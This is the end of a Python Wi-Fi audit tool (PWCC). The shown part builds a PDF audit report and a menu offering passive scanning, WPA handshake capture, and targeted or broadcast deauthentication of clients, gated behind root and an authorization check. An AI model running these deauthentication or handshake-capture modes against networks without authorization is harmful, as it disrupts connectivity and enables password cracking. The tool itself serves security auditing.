        pdf.ln(2)
    if not evil_twins and not unprotected and handshake_count == 0:
        pdf.set_text_color(40, 40, 40)
        pdf.cell(0, 6, "  No significant observations.",
                 new_x=XPos.LMARGIN, new_y=YPos.NEXT)
    pdf.set_text_color(0, 0, 0)
    pdf.ln(4)

    # Session timeline
    pdf.section_title("5. Session Timeline")
    if session_timeline:
        pdf.set_font("Helvetica", "B", 8)
        pdf.set_fill_color(26, 26, 46)
        pdf.set_text_color(255, 255, 255)
        pdf.cell(25, 7, "Time",  fill=True, new_x=XPos.RIGHT, new_y=YPos.TOP)
        pdf.cell(0,  7, "Event", fill=True, new_x=XPos.LMARGIN, new_y=YPos.NEXT)
        pdf.set_font("Helvetica", "", 7)
        pdf.set_text_color(0, 0, 0)
        alt = False
        for ts, event in session_timeline[:50]:
            pdf.set_fill_color(245, 245, 250) if alt else pdf.set_fill_color(255, 255, 255)
            alt = not alt
            import re as _re
            clean = _re.sub(r"\[.*?\]", "", event)
            clean = clean.encode("ascii", "ignore").decode("ascii").strip()
            pdf.cell(25, 5, ts, fill=True, new_x=XPos.RIGHT, new_y=YPos.TOP)
            pdf.cell(0,  5, clean[:120], fill=True, new_x=XPos.LMARGIN, new_y=YPos.NEXT)
    else:
        pdf.set_font("Helvetica", "I", 9)
        pdf.cell(0, 6, "  No events logged.", new_x=XPos.LMARGIN, new_y=YPos.NEXT)
    pdf.ln(4)

    pdf.section_title("6. Recommendations")
    pdf.set_font("Helvetica", "", 9)
    recs = [
        "Enable 802.11w (MFP) on all APs. Set Required for WPA3.",
        "Upgrade to WPA3 where possible.",
        "Deploy wireless IDS to detect rogue APs and evil twins.",
        "Implement 802.1X RADIUS for enterprise environments.",
        "Conduct periodic wireless audits.",
    ]
    for i, rec in enumerate(recs, 1):
        pdf.multi_cell(0, 6, f"  {i}. {rec}")
        pdf.ln(1)

    pdf.add_page()
    pdf.section_title("7. Legal & Scope Declaration")
    pdf.set_font("Helvetica", "", 9)
    pdf.multi_cell(0, 6,
        f"Conducted by: {op_name}" + (f"  |  {op_org}" if op_org else "") +
        f"\n\nGenerated by {TOOL} v{VERSION}, developed by {AUTHOR} / {BRAND}. "
        "Used under explicit authorization confirmed at session start.\n\n"
        f"{BRAND} accepts no liability for unauthorized use."
    )

    pdf.output(filename)
    return filename


# ── OPERATOR PROMPT ───────────────────────────────────────────────────────────

def get_operator_info() -> dict:
    console.print(Panel(
        "\n  [bold white]Operator Details[/bold white]\n\n"
        "  These will appear in the PDF report.\n"
        "  [dim]PriViSecurity branding stays fixed in the header.[/dim]\n",
        border_style="blue",
        title="[bold cyan]Report Configuration[/bold cyan]"
    ))
    op_name = console.input("  [cyan]Your name[/cyan]       (analyst): ").strip()
    op_org  = console.input("  [cyan]Organization[/cyan]    (optional): ").strip()
    return {"name": op_name or "Operator", "org": op_org}


# ── MAIN ──────────────────────────────────────────────────────────────────────

def main():
    global stop_threads

    if os.getuid() != 0:
        console.print("[bold red][!] PWCC requires root. Run with sudo.[/bold red]")
        sys.exit(1)

    authorization_gate()
    print_header()
    operator = get_operator_info()

    console.print("\n[bold white]Interface Configuration[/bold white]\n")
    interface = Prompt.ask("[cyan]Monitor-mode interface[/cyan]", default="wlan0mon")
    lab_ssid  = Prompt.ask("[cyan]Your authorized SSID (evil twin detection)[/cyan]", default="")
    lab_bssid = Prompt.ask("[cyan]Your authorized BSSID (blank to skip)[/cyan]", default="")

    console.print()
    mode_table = RichTable(border_style="blue", show_lines=True,
                           title="[bold cyan]PWCC v5.0 - Audit Modes[/bold cyan]")
    mode_table.add_column("No.", style="bold cyan", width=5)
    mode_table.add_column("Mode",        style="bold white", width=28)
    mode_table.add_column("Type",        style="white",      width=12)
    mode_table.add_column("Description", style="dim white")
    mode_table.add_row("1", "Passive Surveillance",
                       "Read-only",
                       "Live dashboard: networks + clients + evil twin detection")
    mode_table.add_row("2", "EAPOL Handshake Hunt",
                       "Read-only",
                       "Passive WPA/WPA2 handshake capture + full dashboard")
    mode_table.add_row("3", "Targeted Deauth Test",
                       "Active",
                       "Auto-scans clients first, then deauths specific client")
    mode_table.add_row("4", "Broadcast Deauth Test",
                       "Active",
                       "Deauths all clients on a specific AP")
    console.print(mode_table)
    console.print()

    mode = Prompt.ask("[cyan]Select mode[/cyan]", choices=["1", "2", "3", "4"])

    # Start sniff + channel hop for ALL modes
    threading.Thread(
        target=channel_hopper, args=(interface,), daemon=True
    ).start()
    threading.Thread(
        target=lambda: sniff(
            iface=interface,
            prn=lambda pkt: packet_callback(pkt, lab_ssid, lab_bssid),
            store=0
        ),
        daemon=True
    ).start()

    try:
        if mode == "1":
            run_passive_surveillance(interface, lab_ssid, lab_bssid)
        elif mode == "2":
            run_handshake_hunt(interface, lab_ssid, lab_bssid)
        elif mode == "3":
            run_targeted_deauth(interface)
        elif mode == "4":
            run_broadcast_deauth(interface)
    except KeyboardInterrupt:
        pass
    finally:
        stop_threads = True
        console.print("\n[bold yellow][!] Session terminated.[/bold yellow]")
        if networks:
            # Save PCAP first
            pcap_file = save_pcap()

            console.print("\n[bold cyan][*] Generating report...[/bold cyan]")
            mode_labels = {
                "1": "Passive Surveillance", "2": "EAPOL Handshake Hunt",
                "3": "Targeted Deauth Test", "4": "Broadcast Deauth Test",
            }
            try:
                fname = generate_pdf_report(
                    networks, client_info, len(captured_handshakes),
                    mode_labels.get(mode, "Unknown"),
                    pcap_file, operator
                )
                if fname:
                    console.print(f"[bold green][+] Report: {fname}[/bold green]")
            except Exception as e:
                console.print(f"[bold red][!] PDF failed: {e}[/bold red]")
        console.print("\n[bold green][+] PWCC closed. PriViSecurity standing by.[/bold green]\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[bold yellow][!] Exit.[/bold yellow]")
        sys.exit(0)
